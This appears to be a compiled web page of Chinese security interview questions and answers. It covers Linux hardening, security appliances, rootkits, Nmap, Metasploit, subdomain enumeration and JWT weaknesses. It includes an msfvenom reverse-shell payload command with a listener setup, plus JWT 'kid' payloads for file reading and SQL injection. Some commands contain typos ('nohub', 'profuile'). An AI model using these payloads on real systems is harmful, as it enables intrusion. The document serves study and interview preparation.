details"><summary>服务器被植入挖矿病毒如何应对？</summary><p>1）分析网络流量找到挖矿病毒的进程和对外连接地址</p><p>2）根据挖矿病毒进程找到病毒文件样本，上传沙箱分析钱包地址</p><p>3）完全清除病毒样本加固服务器</p></details><details class="custom-container details"><summary>Linux基线加固思路？</summary><p>删除或禁用不必要账户( userdell、passwd -l )</p><p>检查是否存在空口令和root权限的账户</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">awk</span> -F: ‘<span class="token punctuation">(</span><span class="token variable">$2</span><span class="token operator">==</span>””<span class="token punctuation">)</span>’ /etc/passwd
<span class="token function">awk</span> -F: ‘<span class="token punctuation">(</span><span class="token variable">$3</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>’ /etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>添加口令策略 (chage -m 0 -M 30 -E 2000-01-01 -W 7)，设置密码输错锁定</p><p>限制能su到root的用户(vi /etc/pam.d/su)</p><p>禁止root用户直接登录</p><p>关闭不必要的服务 ( systemctl disable 服务名)</p><p>加固SSH服务 ( 使用协议版本2，修改密码允许错误次数为3 )</p><p>设置umask 027 (vi /etc/profile)，即属主有全部权限，同用户组能读和执行，其它无权限；</p><p>设置登陆超时，(vi /etc/profuile)，TMOUT=180，登录三分钟后超时。</p><p>开启日志功能，syslogd日志(系统日志 /var/log/messages，安全日志 /var/log/secure)；</p></details><details class="custom-container details"><summary>IPS和IDS的区别？</summary><p>常见网络安全设备</p><table><thead><tr><th>设备</th><th>功能</th><th>部署方式</th></tr></thead><tbody><tr><td>IDS</td><td>入侵检测系统（基于流量检测攻击）</td><td>旁路</td></tr><tr><td>IPS</td><td>入侵防御系统（基于入侵行为库阻断攻击）</td><td>串联</td></tr><tr><td>FireWall</td><td>防火墙（隔离网络边界控制数据交互）</td><td>串联</td></tr><tr><td>WAF</td><td>Web应用防火墙（基于规则阻断针对Web应用的攻击）</td><td>串联</td></tr><tr><td>GAP</td><td>网闸（信息交换与安全隔离，逻辑隔离）</td><td>串联</td></tr><tr><td>FGAP</td><td>光闸（单项信息传输，逻辑隔离）</td><td>串联</td></tr><tr><td>堡垒机</td><td>运维安全审计系统（身份验证、账号管理、授权控制、安全审计）</td><td>旁路</td></tr><tr><td>DBAudit</td><td>数据库审计（实时记录网络上的数据库活动）</td><td>流量镜像</td></tr><tr><td>AV/EDR</td><td>终端安全（基于特征和行为等查杀危险程序和进程）</td><td>终端安装</td></tr><tr><td>SOC</td><td>安全运营中心（协调所有安全技术提高检测、响应和预防能力）</td><td></td></tr></tbody></table></details><details class="custom-container details"><summary>AV和EDR有何区别？</summary><p><strong>AV</strong>（Antivirus）是传统的安全防护技术，它主要依靠已知的病毒特征库来检测和防御病毒。</p><p>当一个文件被扫描时，AV软件会将其与病毒特征库中的已知病毒特征进行比较。</p><p>如文件与任何一个已知的病毒特征匹配，AV将标记该文件为恶意软件并采取适当的措施来保护系统。</p><p><strong>EDR</strong>（Endpoint Detection and Response）则是一种新兴的安全防护技术，它不仅能够检测已知的病毒，还可以发现和响应未知的威胁。</p><p>EDR软件在主机上运行，收集和分析主机的行为和活动数据，以便发现恶意活动。</p><p>EDR技术利用机器学习和人工智能等高级技术来识别异常行为，并使用防御措施来保护系统。</p></details><details class="custom-container details"><summary>从主机的层面，反弹shell如何监控？</summary><p>黑客一般会从最简单的TCP协议的反弹shell尝试</p><p>所以HIDS首先要监控基于TCP协议的输入流和输出流重定向流量</p></details><details class="custom-container details"><summary>Linux 中让命令在后台运行的方法有哪些？</summary><p>在命令后加**&amp;<strong>，已在前台运行的用</strong>crtl+z**暂停，然后用bg将作业放到后台；</p><p><strong>jobs -l</strong>可查看作业队列；<strong>fg</strong>可恢复到前台运行；</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>nohub ./test.sh <span class="token operator">&amp;</span> <span class="token comment">#守护进程</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>Rootkit的种类有哪些，针对不同种类的Rootkit应该如何防护以及检测？</summary><p>固件Rootkit</p><p>虚拟化Rootkit</p><p>内核级Rootkit</p><p>库级Rootkit</p><p>应用级Rootkit</p><p>Rootkit通过加载特殊驱动，修改系统内核隐藏自身及指定文件、进程和网络链接等。</p><p>可以使用chkrootkit工具检测，定期检查MD5、更新软件、安装杀软等方式防护</p><p>对于找出的 Rootkit，最好的应对方法便是擦除并重新安装系统</p></details><h2 id="安全开发-工具" tabindex="-1"><a class="header-anchor" href="#安全开发-工具" aria-hidden="true">#</a> 安全开发&amp;工具</h2><details class="custom-container details"><summary>Nmap扫描方式有哪几种？怎么扫描快？</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token parameter variable">-sT</span>	<span class="token comment">#TCP全连接扫描</span>
<span class="token parameter variable">-sS</span>	<span class="token comment">#TCP SYN半连接扫描 ()</span>
<span class="token parameter variable">-sU</span>	<span class="token comment">#UDP</span>
<span class="token parameter variable">-sA</span>	<span class="token comment">#ACK</span>
<span class="token parameter variable">-sF</span>	<span class="token comment">#FIN</span>

<span class="token parameter variable">-T4</span>	<span class="token comment">#设置时序模板越高越快</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>MSF有哪些模块？</summary><table><thead><tr><th>辅 助 模 块 (Auxiliary，扫描器)</th><th>扫描主机系统，寻找可用漏洞；</th></tr></thead><tbody><tr><td>渗透攻击模块 (Exploits)</td><td>进行漏洞利用攻击；</td></tr><tr><td>攻击载荷模块 (Payloads)</td><td>生成攻击载荷（木马）；</td></tr><tr><td>后渗透攻击模块 (Post)</td><td>用于内网渗透的各种操作；</td></tr><tr><td>编 码 器 模 块 (Encoders)</td><td>选择编码技术，绕过杀软（或其他免杀方式）</td></tr></tbody></table><p>所有模块位置：**/usr/share/metasploit-framework/modules/</p></details><details class="custom-container details"><summary>MSF如何生成木马建立监听？</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>msf <span class="token operator">&gt;</span> use exploit/multi/handler
msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp
<span class="token builtin class-name">set</span> LHOST
<span class="token builtin class-name">set</span> LPORT
run

msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>IP <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">8089</span> <span class="token parameter variable">-f</span> dll <span class="token operator">&gt;</span> shell.dll
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>SQLmap注入怎么用？</summary><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sqlmap -r bp.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>子域名挖掘如何处理泛解析？</summary><p><strong>泛解析定义</strong></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>泛域名解析是一种特殊的域名解析方式，它使用通配符*形式，设置域名解析。
它可以将没有明确设置的子域名一律解析到一个IP地址上。
这样，即使用户输入错误的子域名，也可以访问到域名持有者指定的IP地址。
但是信息收集中，这会造成请求的所有子域名都能访问的假象，从而收集到一堆无效的子域名。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>Onforall的处理方法</strong></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>）随机生成3个子域名做DNS解析
<span class="token number">2</span>）如果没有都解析成功证明不是泛解析，都解析成功的话做HTTP请求判断
<span class="token number">3</span>）HTTP访问都成功则不是泛解析，反之则计算两两响应页面的相似度
<span class="token number">4</span>）有一组相似判断为不是泛解析，都不相似就是泛解析
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>自己的实现</strong></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>）用一个绝对不存在的子域名去解析A记录，如有记录则存在泛解析
<span class="token number">2</span>）用不存在的子域名提取CNAME记录，作为泛解析对比标志
<span class="token number">3</span>）接下来的流程用Lookupcname解析剩余子域名，与泛解析标志做对比,如果不一样并且不为空则此子域名存在
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>Go编写的端口扫描器在Linux平台漏报原因？</summary><p>Golang的<code>net.DialTimeout</code>这个函数最终其实就是调用<code>linux socket</code></p><p>而linux中任何东西都是文件，同时linux默认允许同时打开的文件数是1024</p><p>协程数量大于1024就会导致socket链接建立失败，漏报大量端口</p><p>将open files数量设置大一点即可</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">ulimit</span> <span class="token parameter variable">-n</span> <span class="token number">10000</span>	<span class="token comment">#临时解决办法，当前终端生效</span>

<span class="token comment">#永久生效方法</span>
<span class="token builtin class-name">echo</span> <span class="token string">&quot;* soft nofile 65533&quot;</span> <span class="token operator">&gt;&gt;</span> /etc/security/limits.conf
<span class="token builtin class-name">echo</span> <span class="token string">&quot;* hard nofile 65533&quot;</span> <span class="token operator">&gt;&gt;</span> /etc/security/limits.conf
<span class="token builtin class-name">echo</span> session required /lib/security/pam_limits.so <span class="token operator">&gt;&gt;</span> /etc/pam.d/login
<span class="token comment">#重启系统</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>Ajax发送POST请求会发几个数据包？</summary><p>两个，一个OPTIONS预请求，一个发送数据的请求</p></details><details class="custom-container details"><summary>HTTPS连接建立过程？</summary><p>1、客户端发送支持的加密协议版本（TLS）</p><p>2、服务器从中筛选合适的加密协议版本</p><p>3、服务器端返回证书，证书中有公钥</p><p>4、客户端使用根证书验证证书合法性</p><p>5、客户端生成对称密钥，通过证书中的公钥加密，发送到服务端</p><p>6、服务端使用私钥解密，获取对称密钥，使用对称密钥加密数据</p><p>7、客户端解密数据，SSL加密通信建立，开始通信......</p></details><details class="custom-container details"><summary>Cookie和Session有什么区别 ，后端Session是如何进行保存的？</summary><p>Cookie保存在客户端，Session保存在服务端。</p><ul><li>创建唯一的Session ID，将其关联到用户请求。</li><li>在服务器端创建一个对应的Session对象，用于存储和管理与该Session ID相关的数据。</li><li>将Session ID发送到客户端，通常通过Cookie或URL重写。</li><li>在后续的用户请求中，服务器通过Session ID来查找和恢复对应的Session对象，从而实现数据读取和写入。</li></ul></details>`,85),h={class:"custom-container details"},y=s("summary",null,"JWT Token是什么，有什么安全上的风险？",-1),k={href:"https://jwt.io/",target:"_blank",rel:"noopener noreferrer"},S=a(`<p>JWT（JSON Web Token）是一种用于身份验证和授权的开放标准，用于在不同系统之间传输信息。</p><p>JWT由三个部分组成，这些部分使用点（.）分隔。</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code>header.payload.signature
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ol><li><strong>Header（头部）</strong>: 包含有关JWT的元数据和算法信息。它通常包含两个字段：<code>alg</code>（用于指定用于签名的算法，例如HMAC SHA256或RSA）和<code>typ</code>（类型，通常值为&quot;JWT&quot;）。</li><li><strong>Payload（负载）</strong>: 包含要传输的数据。Payload中的数据称为声明（claims），声明是有关实体（通常是用户）和其他数据的声明。声明分为三种类型：注册声明（注册的声明名称，例如&quot;iss&quot;表示签发者），公共声明（预定义的声明名称，但不强制，例如&quot;sub&quot;表示主题），和私有声明（自定义声明名称）。</li><li><strong>Signature（签名）</strong>: 用于验证消息的完整性和身份验证。签名使用Header中指定的算法以及一个密钥，将Header和Payload进行签名。签名是将Header、Payload和密钥结合在一起通过指定算法生成的哈希值。</li></ol><p>JWT Token的优点：</p><ul><li>简单：由于信息是以JSON格式存储的，因此易于解析和处理。</li><li>自包含：所有必要的信息都包含在Token本身中，无需查询数据库。</li><li>可扩展：可以添加自定义声明来满足特定需求。</li></ul><p>安全上的风险：</p><ul><li><strong>JWT Token伪造</strong>: 如果JWT Token中的Payload部分是可以被用户篡改的，攻击者可能会修改Token中的数据以获取未授权的权限(改用户名和ID获取对应权限，需要知道密钥，密钥一般硬编码在源码里)。</li><li><strong>Token过期问题</strong>: JWT可以设置过期时间（exp）来限制Token的有效期，如果过期时间太长，增加了泄露风险。攻击者可以使用它来冒充用户或访问受保护的资源。</li><li><strong>JWT None攻击</strong>：JWT支持使用空加密算法，可以在header中指定alg为<code>None</code>。这样的话，只要把signature设置为空（即不添加签名字段），提交到服务器，任何token都可以通过服务器的验证。</li><li><strong>KID参数</strong>：<code>kid</code>是jwt header中的一个可选参数，全称是<code>key ID</code>，它用于指定加密算法的密钥。</li></ul><p><strong>任意文件读取</strong></p><p><code>kid</code>参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，所以，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>{
    &quot;alg&quot; : &quot;HS256&quot;,
    &quot;typ&quot; : &quot;jwt&quot;,
    &quot;kid&quot; : &quot;/etc/passwd&quot;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>SQL注入</strong></p><p><code>kid</code>也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>{
    &quot;alg&quot; : &quot;HS256&quot;,
    &quot;typ&quot; : &quot;jwt&quot;,
    &quot;kid&quot; : &quot;key11111111&#39; || union select &#39;secretkey&#39; -- &quot;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,14),x=a('<details class="custom-container details"><summary>僵尸进程和孤儿进程的区别是什么?</summary><p>正常情况下子进程由父进程创建，子进程再创建子进程，这是一个异步过程，父进程无法预测子进程的结束，所以子进程结束后它的父进程会调用<code>wait()</code>或者<code>waitpid()</code>取得子进程的终止状态，回收子进程资源。</p><p>孤儿进程：父进程已经结束，而它的子进程还在运行，这些子进程就是孤儿进程（father died）</p><p>孤儿进程的资源由<code>init</code>守护进程（pid=1）回收，因此孤儿进程没什么危害。</p><p>僵尸进程：子进程退出了，父进程没用wait()获取子进程的终止状态信息，子进程描述符还在系统中。</p><p>系统中所能使用的进程号是有限的，如果大量产生僵尸进程，将因没有可用的进程号而导致系统无法产生新的进程。可以通过信号机制，子进程退出时向父进程发送SIGCHLD信号解决僵尸进程问题。</p><p>暴力解决办法直接杀死其父进程，让init进程接管做资源回收。</p></details>',1);function I(D,P){const n=o("ExternalLinkIcon");return l(),d("div",null,[p,s("details",c,[m,s("p",null,[e('1）空间搜索引擎（title="xxx"、cert="'),s("a",u,[e("xxx.com"),t(n)]),e('"、icon_hash="xxx"）')]),v,b]),g,s("details",h,[y,s("p",null,[s("a",k,[e("https://jwt.io/"),t(n)])]),S]),x])}const q=i(r,[["render",I],["__file","mj.html.vue"]]);export{q as default};
